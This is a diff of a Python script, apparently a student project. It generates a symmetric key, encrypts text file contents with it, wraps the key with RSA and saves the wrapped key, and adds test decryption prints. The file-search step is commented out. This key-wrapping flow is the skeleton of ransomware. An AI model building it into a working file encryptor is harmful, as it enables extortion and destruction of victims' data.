@@ -24,7 +24,7 @@ from utils import *
 a=generate_key(16)
 
 #2
-findTxtFile()
+#findTxtFile()
 
 #3
 # here we need to encrypt the test files from the previous step, but for now we use a dummy file
@@ -34,6 +34,8 @@ file_path = r'file_paths.txt'
 with open(file_path, 'r') as f:
         data = f.read()
 encrypted_data = encrypt_data(a, data)
+with open('encrypted_file', 'wb') as f:
+        f.write(encrypted_data)
 
 
 #4
@@ -52,13 +54,16 @@ public_key = RSA.import_key(exported_public_key)
 #convert ascii_key to bytes
 byte_ascii_key = a.encode()
 encoded_encrypted_msg = encryptWithRSA(byte_ascii_key, public_key)
-with open('encrypted_file', 'wb') as f:
-        f.write(encrypted_data)
 
 #8
 saveKey(encoded_encrypted_msg.decode(), "encryptedKey.key")
 d=decrypt_with_RSA(encoded_encrypted_msg.decode(), exported_private_key)
-testEncryption()
+# Here we try to decrypt the encrypted data in the .txt file ya Sharaway
+d2=decrypt_data(a,encrypted_data)
+print(encoded_encrypted_msg.decode())
+print(d)
+print(d2)
+# testEncryption()
 # with open("decr.txt", "a") as f:
 #                         f.write(d2 + "\n")
 
